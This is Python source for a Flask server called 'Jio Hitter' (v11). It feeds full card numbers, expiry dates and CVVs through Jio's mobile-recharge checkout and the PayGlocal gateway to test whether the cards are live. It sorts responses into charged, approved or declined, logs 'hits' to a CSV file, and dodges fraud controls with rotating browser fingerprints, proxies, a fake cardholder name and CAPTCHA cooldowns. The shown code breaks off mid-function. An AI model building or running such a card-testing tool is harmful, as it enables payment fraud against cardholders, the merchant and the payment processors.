"""
Jio Hitter — Flask Server (v11 — REAL PAYABLE AMOUNT)
pip install flask curl_cffi requests

Endpoints:
  GET /rc?jio=<number>&amount=<amt>&cc=<cc|mm|yy|cvv>[&proxy=<url>][&debug=1]

v11 changes vs v10:
  The `amount` field now reflects the TRUE payable amount that PayGlocal
  charges the card — including any Jio convenience fee. Previously we
  echoed the plan amount (₹349) instead of the charged amount (₹360).

  How we find the real amount:
    1. Scan EVERY response (steps 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)
       for numeric amount fields AND text like "₹360" / "Rs 360"
    2. Decode every JWT we encounter (xglToken, x-gl-token, accessToken,
       encdata, etc.) and search their payloads for amount keys
    3. Prefer PayGlocal-source amounts over Jio-source amounts
    4. Fall back gracefully: payglocal > redirect-form > Jio-pay > plan

  With `?debug=1` you get a `debug_trace` field showing every amount
  found at every step, plus its source. Use this once to verify where
  the real amount appears, then drop the param.
"""

import os
import csv
import re
import time
import random
import base64
import json
import datetime
from typing import Optional, Tuple, List, Dict, Any

from flask import Flask, request, jsonify

app = Flask(__name__)



LOG_FILE = os.environ.get("JIO_LOG_FILE", "hits.csv")
MAX_RETRIES = 2
RETRY_DELAY_MIN = 2.0
RETRY_DELAY_MAX = 4.0



PROFILES = [
    {"imp": "chrome131",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"',
     "plat": '"Windows"', "mob": "?0"},
    {"imp": "chrome124",
     "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"',
     "plat": '"macOS"', "mob": "?0"},
    {"imp": "chrome123",
     "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"',
     "plat": '"Linux"', "mob": "?0"},
    {"imp": "edge101",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36 Edg/101.0.0.0",
     "ch": '"Microsoft Edge";v="101", "Not_A Brand";v="8", "Chromium";v="101"',
     "plat": '"Windows"', "mob": "?0"},
    {"imp": "chrome120",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="120", "Not_A Brand";v="8", "Chromium";v="120"',
     "plat": '"Windows"', "mob": "?0"},
    {"imp": "firefox135",
     "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     "ch": '"Firefox";v="135", "Not_A Brand";v="8"',
     "plat": '"Windows"', "mob": "?0"},
]

SCREENS = [
    {"h": 1080, "w": 1920, "depth": 24},
    {"h": 900,  "w": 1440, "depth": 30},
    {"h": 768,  "w": 1366, "depth": 24},
    {"h": 1200, "w": 1920, "depth": 24},
]

LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "en-IN,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.9,hi;q=0.8",
]

GATEWAY_NAMES = (
    "payglocal", "paytm", "razorpay", "cashfree",
    "billdesk", "ccavenue", "payu", "instamojo",
    "phonepe", "pinepg",
)

GATEWAY_IGNORE = ("easebuzz", "juspay", "jiopg", "jpgpciapp", "jioconnect")

SUPPORTED_BRANDS = {"visa", "mastercard", "amex"}




def format_proxy(p: Optional[str]) -> Optional[str]:
    """Normalize proxy input to http://user:pass@host:port for curl_cffi.
    Accepts: http(s)://..., user:pass@host:port, host:port:user:pass, host:port."""
    if not p:
        return None
    s = p.strip()
    if not s:
        return None
    if s.lower().startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    if "@" in s:
        return "http://" + s
    parts = s.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if "." in a and b.isdigit():          # host:port:user:pass
            return f"http://{c}:{d}@{a}:{b}"
        if "." in c and d.isdigit():          # user:pass:host:port
            return f"http://{a}:{b}@{c}:{d}"
        return f"http://{c}:{d}@{a}:{b}"
    if len(parts) == 2:
        return "http://" + s
    return None


def _parse_card(text: str) -> Optional[dict]:
    m = re.search(r"(\d{13,19})\D(\d{1,2})\D(\d{2,4})\D(\d{3,4})", text or "")
    if not m:
        return None
    cc, mm, yy, cvv = m.groups()
    if len(yy) == 2:
        yy = "20" + yy
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


def _mask(card_num: str) -> str:
    return f"{card_num[:6]}xxxxxx{card_num[-4:]}"


def _detect_brand(card_num: str) -> dict:
    n = re.sub(r"\D", "", card_num or "")
    if not n:
        return {"brand": "unknown", "customer_card_type": "unknown",
                "card_type": "unknown", "card_type_text": "UNKNOWN"}
    if n[0] == "4":
        return {"brand": "visa", "customer_card_type": "visa",
                "card_type": "ic_visa", "card_type_text": "VISA_CARD"}
    if len(n) >= 2 and 51 <= int(n[:2]) <= 55:
        return {"brand": "mastercard", "customer_card_type": "mastercard",
                "card_type": "ic_mastercard", "card_type_text": "MASTERCARD_CARD"}
    if len(n) >= 4 and 2221 <= int(n[:4]) <= 2720:
        return {"brand": "mastercard", "customer_card_type": "mastercard",
                "card_type": "ic_mastercard", "card_type_text": "MASTERCARD_CARD"}
    if len(n) >= 2 and n[:2] in ("34", "37"):
        return {"brand": "amex", "customer_card_type": "amex",
                "card_type": "ic_amex", "card_type_text": "AMEX_CARD"}
    if n.startswith("35"):
        return {"brand": "jcb", "customer_card_type": "jcb",
                "card_type": "ic_jcb", "card_type_text": "JCB_CARD"}
    if (n.startswith("6011") or n.startswith("65")
            or n.startswith("64") or n.startswith("622")):
        return {"brand": "discover", "customer_card_type": "discover",
                "card_type": "ic_discover", "card_type_text": "DISCOVER_CARD"}
    if n.startswith(("36", "38", "300", "301", "302", "303", "304", "305")):
        return {"brand": "diners", "customer_card_type": "diners",
                "card_type": "ic_diners", "card_type_text": "DINERS_CARD"}
    if n.startswith(("60", "81", "82", "508")):
        return {"brand": "rupay", "customer_card_type": "rupay",
                "card_type": "ic_rupay", "card_type_text": "RUPAY_CARD"}
    return {"brand": "unknown", "customer_card_type": "unknown",
            "card_type": "unknown", "card_type_text": "UNKNOWN"}


def _detect_gateway(*urls: str) -> str:
    joined = " ".join(u or "" for u in urls).lower()
    for name in GATEWAY_NAMES:
        if name in joined:
            return name
    return "unknown"


def _jh(ua, ch, plat, mob, lg, ref, ct=None, origin=None, extra=None):
    h = {
        "Accept-Language": lg,
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Referer": ref,
        "User-Agent": ua,
        "sec-ch-ua": ch,
        "sec-ch-ua-mobile": mob,
        "sec-ch-ua-platform": plat,
    }
    if ct:     h["Content-Type"] = ct
    if origin: h["Origin"] = origin
    if extra:  h.update(extra)
    return h







_AMOUNT_KEYS = {
    "amount", "transactionamount", "txnamount", "paymentamount",
    "totalamount", "orderamount", "chargedamount", "capturedamount",
    "originalamount", "amt", "value", "payableamount", "netamount",
    "finalamount", "totalpayable", "grossamount", "netpayable",
    "grandtotal", "ordervalue", "txnvalue", "billamount", "gst",
    "conveniencefee", "platformfee", "chargeamount", "mrp",
    "planamount", "rechargeamount", "payamount", "amountpayable",
}


_TEXT_AMOUNT_RE = re.compile(
    r"(?:₹|&#8377;|\\u20b9|Rs\.?|INR)\s*([0-9][0-9,]*(?:\.[0-9]{1,2})?)",
    re.IGNORECASE
)


def _to_amount(v) -> Optional[float]:
    """Coerce a value to a positive float, or None."""
    if v is None or isinstance(v, bool):
        return None
    if isinstance(v, (int, float)):
        try:
            f = float(v)
        except (TypeError, ValueError):
            return None
        return f if f > 0 else None
    if isinstance(v, str):
        s = re.sub(r"[^\d.]", "", v)
        if not s:
            return None
        try:
            f = float(s)
        except ValueError:
            return None
        return f if f > 0 else None
    if isinstance(v, dict):
        for k in ("value", "amount", "amt", "val", "price"):
            if k in v:
                f = _to_amount(v[k])
                if f is not None:
                    return f
    return None


def _jwt_payload(token: str) -> Optional[dict]:
    """Decode the payload of a JWT (middle segment). Returns dict or None."""
    if not token or not isinstance(token, str):
        return None
    parts = token.split(".")
    if len(parts) < 2:
        return None
    seg = parts[1]
    try:
        seg += "=" * (-len(seg) % 4)
        raw = base64.urlsafe_b64decode(seg)
        return json.loads(raw.decode("utf-8", errors="ignore"))
    except Exception:
        return None


def _scan_json_for_amounts(obj, source: str, out: List[Dict], depth: int = 0):
    """Walk a JSON tree and collect any numeric value under an amount-like key."""
    if depth > 8 or obj is None:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            kl = str(k).lower().replace("_", "").replace("-", "")
            if kl in _AMOUNT_KEYS:
                f = _to_amount(v)
                if f is not None:
                    out.append({"source": f"{source}.{k}", "value": f})

            _scan_json_for_amounts(v, f"{source}.{k}", out, depth + 1)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _scan_json_for_amounts(v, f"{source}[{i}]", out, depth + 1)
    elif isinstance(obj, str):

        pay = _jwt_payload(obj)
        if pay:
            _scan_json_for_amounts(pay, f"{source}.jwt", out, depth + 1)

        for m in _TEXT_AMOUNT_RE.finditer(obj):
            try:
                f = float(m.group(1).replace(",", ""))
                if f > 0:
                    out.append({"source": f"{source}.text", "value": f})
            except ValueError:
                pass


def _scan_text_for_amounts(text: str, source: str, out: List[Dict]):
    """Find ₹/Rs/INR amounts in raw HTML/text."""
    if not text:
        return
    for m in _TEXT_AMOUNT_RE.finditer(text):
        try:
            f = float(m.group(1).replace(",", ""))
            if f > 0:
                out.append({"source": source, "value": f})
        except ValueError:
            pass


def _pick_real_amount(found: List[Dict], plan_amount: float) -> Tuple[float, str]:
    """
    Choose the best amount from everything we found.

    Priority (highest first):
      1. A PayGlocal-source amount (final gateway)
      2. Any amount > plan_amount (fee included)
      3. Any amount == plan_amount
      4. Fall back to plan_amount
    """
    if not found:
        return plan_amount, "plan (fallback)"


    pg = [f for f in found if "payglocal" in f["source"].lower()
          or "ipay" in f["source"].lower()
          or "r15" in f["source"].lower()]
    if pg:
        best = max(pg, key=lambda x: x["value"])
        return best["value"], best["source"]


    bigger = [f for f in found if f["value"] > plan_amount + 0.5]
    if bigger:
        best = min(bigger, key=lambda x: x["value"])
        return best["value"], best["source"]


    exact = [f for f in found if abs(f["value"] - plan_amount) < 0.5]
    if exact:
        return plan_amount, exact[0]["source"]


    return plan_amount, "plan (fallback)"




_DETAILED_INSUFFICIENT = {
    "insufficient funds", "insufficient fund", "insufficient balance",
    "insufficient account balance", "no sufficient funds", "not sufficient funds",
}
_DETAILED_DO_NOT_HONOR = {"do not honor", "do not honour"}
_DETAILED_INVALID_CARD = {"invalid card", "invalid card number"}
_DETAILED_INVALID_ACCOUNT = {"invalid account", "invalid account number"}
_DETAILED_EXPIRED = {"expired card", "card expired", "expired"}
_DETAILED_INVALID_CVV = {"invalid cvv", "cvv mismatch", "cvv failure"}
_DETAILED_BLOCKED = {"card blocked", "blocked card", "card is blocked"}
_DETAILED_RESTRICTED = {"restricted card", "card restricted"}
_DETAILED_STOLEN = {"stolen card", "card stolen", "lost card"}
_DETAILED_FRAUD = {"fraud", "fraud suspected", "suspected fraud"}
_DETAILED_NOT_ALLOWED = {"transaction not allowed", "not permitted"}
_DETAILED_TIMEOUT = {"timeout", "timed out", "gateway timeout"}


def _classify(pay_status: str, detailed: str,
              data: dict = None, reason_code: str = "") -> Tuple[str, str]:
    ps   = (pay_status or "").upper().strip()
    dm   = (detailed or "").lower().strip()
    rc   = (reason_code or "").upper().strip()
    data = data or {}

    if ps in ("SUCCESS", "CAPTURED", "CHARGED", "AUTHORIZED"):
        return "charged", "payment successful"

    if rc.startswith("GL-4") or rc.startswith("GL-3"):
        return "error", "api error"
    if ps in ("REQUEST_ERROR", "ERROR", "INTERNAL_ERROR",
              "GATEWAY_ERROR", "SYSTEM_ERROR", "SERVICE_UNAVAILABLE",
              "BAD_REQUEST", "INVALID_REQUEST", "PROCESSING_ERROR"):
        return "error", "api error"

    if isinstance(data, dict) and data:
        dk = " ".join(str(k) for k in data.keys()).lower()
        if any(k in dk for k in ("cardinal", "stepup", "step_up", "threeds", "3ds")):
            return "approved", "3ds required"
    if ps in ("INPROGRESS", "IN_PROGRESS", "PENDING", "PENDING_AUTH",
              "3DS", "3DS_REQUIRED", "OTP_REQUIRED", "STEP_UP_REQUIRED",
              "AUTHENTICATION_REQUIRED", "CHALLENGE"):
        return "approved", "3ds required"

    if ps in ("INSUFFICIENT_FUNDS", "INSUFFICIENT_BALANCE"):
        return "approved", "insufficient funds"
    if dm in _DETAILED_INSUFFICIENT:
        return "approved", "insufficient funds"

    if ps in ("STOLEN_CARD", "LOST_CARD") or dm in _DETAILED_STOLEN:
        return "declined", "stolen card"
    if ps == "CARD_BLOCKED" or dm in _DETAILED_BLOCKED:
        return "declined", "card blocked"
    if ps == "RESTRICTED_CARD" or dm in _DETAILED_RESTRICTED:
        return "declined", "card restricted"
    if ps in ("FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD") or dm in _DETAILED_FRAUD:
        return "declined", "fraud suspected"
    if ps in ("CARD_EXPIRED", "EXPIRED_CARD") or dm in _DETAILED_EXPIRED:
        return "declined", "expired card"
    if ps in ("INVALID_CVV", "CVV_FAILURE", "CVV_MISMATCH") or dm in _DETAILED_INVALID_CVV:
        return "declined", "invalid cvv"
    if ps == "INVALID_ACCOUNT" or dm in _DETAILED_INVALID_ACCOUNT:
        return "declined", "invalid account"
    if ps in ("INVALID_CARD", "INVALID_CARD_NUMBER") or dm in _DETAILED_INVALID_CARD:
        return "declined", "invalid card"
    if ps in ("DO_NOT_HONOR", "DO_NOT_HONOUR") or dm in _DETAILED_DO_NOT_HONOR:
        return "declined", "do not honor"
    if ps in ("NOT_PERMITTED", "TRANSACTION_NOT_ALLOWED") or dm in _DETAILED_NOT_ALLOWED:
        return "declined", "transaction not allowed"
    if ps in ("TIMEOUT", "GATEWAY_TIMEOUT") or dm in _DETAILED_TIMEOUT:
        return "declined", "bank timeout"

    if ps == "ISSUER_DECLINE":
        return "declined", "declined by issuer"
    if ps == "DECLINED":
        return "declined", "declined"
    if ps:
        return "declined", "declined"
    return "error", "api error"


def _resp(status: str, response: str, number: str, card: str,
          amount=None, plan: str = "", gate: str = "unknown", **extra) -> dict:
    out = {
        "status":   status.lower(),
        "amount":   amount if amount not in (None, "") else "N/A",
        "gate":     gate or "unknown",
        "response": response,
        "plan":     plan,
        "number":   number,
        "card":     card,
    }
    out.update(extra)
    return out


def _log_result(number: str, masked: str, result: dict, reason_code: str = ""):
    try:
        new_file = not os.path.exists(LOG_FILE)
        with open(LOG_FILE, "a", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            if new_file:
                w.writerow(["timestamp", "number", "card", "status",
                            "gate", "amount", "plan", "response", "reason_code"])
            w.writerow([
                datetime.datetime.now().isoformat(timespec="seconds"),
                number, masked,
                result.get("status", ""),
                result.get("gate", ""),
                result.get("amount", ""),
                result.get("plan", ""),
                result.get("response", ""),
                reason_code or "",
            ])
    except Exception as e:
        print(f"  [!] Log write failed: {e}", flush=True)






def _run_jio(number: str, card: dict, amount: float,
             proxy: Optional[str] = None,
             debug: bool = False) -> Tuple[dict, str]:
    masked  = _mask(card["cc"])
    gateway = "unknown"
    brand   = _detect_brand(card["cc"])


    found_amounts: List[Dict] = []

    try:
        from curl_cffi import requests as cffi
    except ImportError:
        return _resp("error", "internal error", number, masked), ""

    pf  = random.choice(PROFILES)
    sc  = random.choice(SCREENS)
    lg  = random.choice(LANGS)
    ua, ch, plat, mob, imp = pf["ua"], pf["ch"], pf["plat"], pf["mob"], pf["imp"]

    _px = format_proxy(proxy)
    proxies = {"http": _px, "https": _px} if _px else None

    sess = cffi.Session(impersonate=imp)
    if proxies:
        sess.proxies = proxies

    def _req(method, url, **kw):
        kw.setdefault("timeout", 30)
        kw.setdefault("verify", False)
        r = sess.request(method, url, **kw)
        print(f"  [{method}] {url[:80]} → {r.status_code}", flush=True)
        return r

    try:
        print(f"\n  Identity: {imp} / {lg.split(',')[0]} / {sc['w']}x{sc['h']}", flush=True)
        print(f"  Card brand: {brand['brand']}", flush=True)


        print("\n[1] Warming session...", flush=True)
        _req("GET", "https://www.jio.com/",
             headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Accept-Language": lg,
                      "User-Agent": ua, "Upgrade-Insecure-Requests": "1",
                      "sec-ch-ua": ch, "sec-ch-ua-mobile": mob, "sec-ch-ua-platform": plat})


        print("\n[2] Number lookup...", flush=True)
        r2 = _req("GET",
                  f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}",
                  headers=_jh(ua, ch, plat, mob, lg, "https://www.jio.com/",
                               extra={"Accept": "application/json, text/plain, */*",
                                      "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                                      "Sec-Fetch-Site": "same-origin"}))
        lookup = r2.json()
        print(f"  Lookup: {lookup}", flush=True)

        if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            return _resp("error", "not a jio number", number, masked, gate=gateway), ""

        # captcha wall — jio rate-shields the IP after bursts; wait it out
        if "CAPTCHA" in str(lookup.get("errorMessage", "")).upper():
            print("  [!] CAPTCHA wall — cooling down 25s…", flush=True)
            time.sleep(25)
            r2 = _req("GET",
                      f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}",
                      headers=_jh(ua, ch, plat, mob, lg, "https://www.jio.com/",
                                   extra={"Accept": "application/json, text/plain, */*",
                                          "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                                          "Sec-Fetch-Site": "same-origin"}))
            lookup = r2.json()
            print(f"  Lookup retry: {lookup}", flush=True)
            if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
                return _resp("error", "not a jio number", number, masked, gate=gateway), ""

        billing_type = lookup.get("billingType") or "PREPAID"
        next_val     = lookup.get("nextPage") or billing_type
        plans_ref    = (f"https://www.jio.com/selfcare/recharge/mobility/plans/"
                        f"?serviceType=mobility&serviceId={number}&next={next_val}"
                        f"&billingType={billing_type}&entrysource=Widget")


        print("\n[3] Plans page visit...", flush=True)
        _req("GET", "https://www.jio.com/selfcare/recharge/mobility/plans/",
             params={"serviceType": "mobility", "serviceId": number,
                     "next": next_val, "billingType": billing_type, "entrysource": "Widget"},
             headers=_jh(ua, ch, plat, mob, lg, "https://www.jio.com/",
                          extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "Upgrade-Insecure-Requests": "1"}))


        print("\n[4] Fetching plans...", flush=True)
        PLAN_ENDPOINTS = [
            (f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{number}", {"billingType": billing_type}),
            (f"https://www.jio.com/api/jio-recharge-service/recharge/plans/mobility", {"serviceId": number, "billingType": billing_type}),
            (f"https://www.jio.com/api/jio-recharge-service/recharge/plans/mobility/prepaid", {"serviceId": number}),
            (f"https://www.jio.com/api/jio-recharge-service/recharge/plan/list", {"serviceId": number, "billingType": billing_type}),
        ]
        plans_json = None
        raw = {}
        for ep, params in PLAN_ENDPOINTS:
            r4 = _req("GET", ep, params=params,
                      headers=_jh(ua, ch, plat, mob, lg, plans_ref,
                                   extra={"Accept": "application/json, text/plain, */*",
                                          "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                                          "Sec-Fetch-Site": "same-origin"}))
            print(f"  {r4.status_code} | {ep[:75]}", flush=True)
            if r4.status_code != 200:
                continue
            raw = r4.json()
            if "errorCode" not in raw and "error" not in raw:
                plans_json = raw
                break
        if plans_json is None:
            return _resp("error", "api error", number, masked, gate=gateway), ""


        _scan_json_for_amounts(plans_json, "r4_plans", found_amounts)

        def _unwrap(j):
            for _ in range(3):
                if isinstance(j, dict) and "data" in j and isinstance(j["data"], (dict, list)):
                    j = j["data"]
                else:
                    break
            return j

        plans_json = _unwrap(plans_json)
        if isinstance(plans_json, list):
            plans_json = {"plans": plans_json}

        CAT_KEYS  = ("planCategories", "planCategoryList", "categories",
                     "planList", "rechargeplanList")
        PLAN_KEYS = ("plans", "planList", "rechargeplanList",
                     "planDetails", "rechargeList")

        def _iter_plans(j):
            for ck in CAT_KEYS:
                for cat in (j.get(ck) or []):
                    cat_name = cat.get("type") or cat.get("name") or cat.get("categoryName") or ""
                    for sk in ("subCategories", "subCategoryList", "subCategory"):
                        for sub in (cat.get(sk) or []):
                            for pk in PLAN_KEYS:
                                for p in (sub.get(pk) or []):
                                    p.setdefault("_cat", cat_name)
                                    yield p
                    for pk in PLAN_KEYS:
                        for p in (cat.get(pk) or []):
                            p.setdefault("_cat", cat_name)
                            yield p
            for pk in PLAN_KEYS:
                for p in (j.get(pk) or []):
                    yield p

        all_plans = []
        for p in _iter_plans(plans_json):
            key = (p.get("key") or p.get("planKey") or p.get("id") or p.get("planId"))
            if not key:
                continue
            try:
                amt = float(p.get("amount") or p.get("price") or p.get("rs")
                            or p.get("mrp") or p.get("planPrice") or 0)
            except (TypeError, ValueError):
                continue
            if amt <= 0:
                continue
            all_plans.append({
                "key": key,
                "amount": amt,
                "name": (p.get("name") or p.get("desc") or p.get("description")
                         or p.get("planName") or p.get("_cat") or ""),
                "_raw": p,
            })

        if not all_plans:
            return _resp("error", "no plan found", number, masked, gate=gateway), ""

        target = float(amount)
        match = None
        for p in all_plans:
            if abs(p["amount"] - target) < 0.01:
                if match is None or p["amount"] < match["amount"]:
                    match = p

        if match is None:
            avail = sorted({p["amount"] for p in all_plans})
            return _resp(
                "error", "no plan found",
                number, masked, gate=gateway,
                available_amounts=avail[:40],
            ), ""

        plan_key    = match["key"]
        plan_name   = match["name"]
        plan_amount = match["amount"]


        _scan_json_for_amounts(match["_raw"], "r4_matched_plan", found_amounts)

        print(f"\n  Selected plan: {plan_name} | ₹{plan_amount} | key: {plan_key}", flush=True)


        print("\n[5] Buy...", flush=True)
        _req("POST", "https://www.jio.com/api/jio-recharge-service/recharge/buy",
             headers=_jh(ua, ch, plat, mob, lg, plans_ref,
                          ct="application/json", origin="https://www.jio.com",
                          extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                 "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}),
             json={"planKey": plan_key, "selectedService": number})


        print("\n[6] Pay...", flush=True)
        r6 = _req("POST", "https://www.jio.com/api/jio-recharge-service/recharge/pay",
                  headers=_jh(ua, ch, plat, mob, lg, plans_ref,
                               ct="application/json", origin="https://www.jio.com",
                               extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                      "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}),
                  json={"addonPlanKeys": [], "flexiTopupFlow": False,
                        "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": number}]})
        pay_resp = r6.json()
        print(f"  Pay resp: {pay_resp}", flush=True)
        _scan_json_for_amounts(pay_resp, "r6_pay", found_amounts)

        payment_url = pay_resp.get("paymentURL",
                      "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")


        print("\n[7] Redirect...", flush=True)
        r7 = _req("GET", payment_url,
                  headers=_jh(ua, ch, plat, mob, lg, plans_ref,
                               extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                      "Upgrade-Insecure-Requests": "1"}),
                  allow_redirects=True)

        fa = re.search(r"action=[\"']([^\"']+)[\"']", r7.text)
        fi = re.findall(r"name=[\"']([^\"']+)[\"'][^>]*?value=[\"']([^\"']*)[\"']", r7.text)
        pay_form_url  = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        pay_form_data = {k: v for k, v in fi}


        if pay_form_data:
            print(f"  Redirect form fields: {list(pay_form_data.keys())}", flush=True)
        _scan_json_for_amounts(pay_form_data, "r7_form", found_amounts)
        _scan_text_for_amounts(r7.text, "r7_html", found_amounts)


        print("\n[8] Pay portal POST...", flush=True)
        r8 = _req("POST", pay_form_url,
                  headers=_jh(ua, ch, plat, mob, lg, "https://www.jio.com/",
                               ct="application/x-www-form-urlencoded",
                               origin="https://www.jio.com",
                               extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                      "Upgrade-Insecure-Requests": "1",
                                      "Sec-Fetch-Dest": "document",
                                      "Sec-Fetch-Mode": "navigate",
                                      "Sec-Fetch-Site": "cross-site"}),
                  data=pay_form_data, allow_redirects=True)
        pay_jio_ref = r8.url
        _scan_text_for_amounts(r8.text, "r8_html", found_amounts)

        _scan_text_for_amounts(pay_jio_ref, "r8_url", found_amounts)


        print("\n[9] Authorize card op...", flush=True)
        r9 = _req("POST", "https://pay.jio.com/jiopg/v1/authorize-card-operation",
                  headers=_jh(ua, ch, plat, mob, lg, pay_jio_ref,
                               ct="application/json", origin="https://pay.jio.com",
                               extra={"Accept": "application/json",
                                      "Sec-Fetch-Dest": "empty",
                                      "Sec-Fetch-Mode": "cors",
                                      "Sec-Fetch-Site": "same-origin"}),
                  json={"paymentMode": "CCDC",
                        "cardPrefix": card["cc"][:6],
                        "isEMISelected": False, "viewOffer": False,
                        "skuCode": None, "copco": None, "isStoreCreditSelected": None})
        d9 = r9.json()
        print(f"  Auth resp: {d9}", flush=True)
        _scan_json_for_amounts(d9, "r9_auth", found_amounts)
        x_token = d9.get("token", "")
        if not x_token:
            return _resp("error", "auth error", number, masked,
                         amount=plan_amount, plan=plan_name, gate=gateway), ""


        print("\n[10] Card confirmation...", flush=True)
        r10 = _req("POST", "https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
                   headers=_jh(ua, ch, plat, mob, lg, pay_jio_ref,
                                ct="application/json", origin="https://pay.jio.com",
                                extra={"Accept": "application/json",
                                       "Sec-Fetch-Dest": "empty",
                                       "Sec-Fetch-Mode": "cors",
                                       "Sec-Fetch-Site": "same-origin",
                                       "x-token": x_token}),
                   json={"cvvNumber": card["cvv"], "cashBackApplied": "N",
                         "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                         "customerCardTypeValue": brand["customer_card_type"],
                         "paymentMode": "CCDC",
                         "offerAppliedByCust": False, "viewOffer": False,
                         "cardType": brand["card_type"],
                         "cardNumber": card["cc"],
                         "cardTypeText": brand["card_type_text"],
                         "expiryMonth": card["mm"], "expiryYear": card["yy"],
                         "cardHolderName": "John Doe", "userCardSaveConsent": False,
                         "browserDetails": {"browserHeader": "application/json",
                                            "browserJavaEnabled": False,
                                            "browserJavascriptEnabled": True,
                                            "browserLanguage": lg.split(",")[0],
                                            "browserColorDepth": sc["depth"],
                                            "browserScreenHeight": sc["h"],
                                            "browserScreenWidth": sc["w"],
                                            "browserTz": -330, "browserUserAgent": ua}})
        d10 = r10.json()

        d10_log = {k: v for k, v in d10.items() if k != "htmlForm"}
        print(f"  Confirm resp: {d10_log}", flush=True)
        _scan_json_for_amounts(d10, "r10_confirm", found_amounts)

        if not d10.get("status"):
            errs = d10.get("errors") or {}
            if not isinstance(errs, dict):
                errs = {}
            detailed = str(errs.get("detailedMessage") or "").strip()
            if not detailed:
                detailed = str(d10.get("message") or "").strip()
            st, code = _classify("", detailed)
            real_amt, src = _pick_real_amount(found_amounts, plan_amount)
            extra = {"amount_source": src} if debug else {}
            if debug:
                extra["debug_trace"] = found_amounts
            return _resp(st, code, number, masked,
                         amount=real_amt, plan=plan_name, gate=gateway,
                         **extra), ""

        html_form = d10.get("htmlForm", "")

        enc_m = re.search(r"name=[\"']encdata[\"']\s+value=[\"']([^\"']+)[\"']", html_form)
        if enc_m:
            try:
                decoded = base64.b64decode(enc_m.group(1)).decode("utf-8", errors="ignore")
                _scan_text_for_amounts(decoded, "r10_encdata", found_amounts)
                _scan_json_for_amounts(json.loads(decoded), "r10_encdata_json", found_amounts)
            except Exception:
                pass


        print("\n[11] 3DS redirect...", flush=True)
        ea  = re.search(r"action=[\"']([^\"']+)[\"']", html_form)
        ei  = re.findall(r"name=[\"']([^\"']+)[\"'][^>]*?value=[\"']([^\"']*)[\"']", html_form)
        eu  = ea.group(1) if ea else ""
        ed  = {k: v for k, v in ei}
        r11 = _req("POST", eu,
                   headers=_jh(ua, ch, plat, mob, lg, pay_jio_ref,
                                ct="application/x-www-form-urlencoded",
                                origin="https://pay.jio.com",
                                extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                       "Upgrade-Insecure-Requests": "1",
                                       "Sec-Fetch-Dest": "document",
                                       "Sec-Fetch-Mode": "navigate",
                                       "Sec-Fetch-Site": "cross-site"}),
                   data=ed, allow_redirects=True)
        _scan_text_for_amounts(r11.text, "r11_html", found_amounts)
        _scan_text_for_amounts(r11.url, "r11_url", found_amounts)


        page_lower = (r11.text or "").lower()
        if any(k in page_lower for k in ("otp", "3d secure", "authentication required",
                                          "enter otp", "verify with bank", "challenge")):
            gateway = "payglocal"
            real_amt, src = _pick_real_amount(found_amounts, plan_amount)
            extra = {"amount_source": src} if debug else {}
            if debug:
                extra["debug_trace"] = found_amounts
            return _resp("approved", "3ds required", number, masked,
                         amount=real_amt, plan=plan_name, gate=gateway,
                         **extra), ""

        m_gl = re.search(r"x-gl-token=([^&\s\"'\\]+)", r11.url + r11.text)
        if not m_gl:
            real_amt, src = _pick_real_amount(found_amounts, plan_amount)
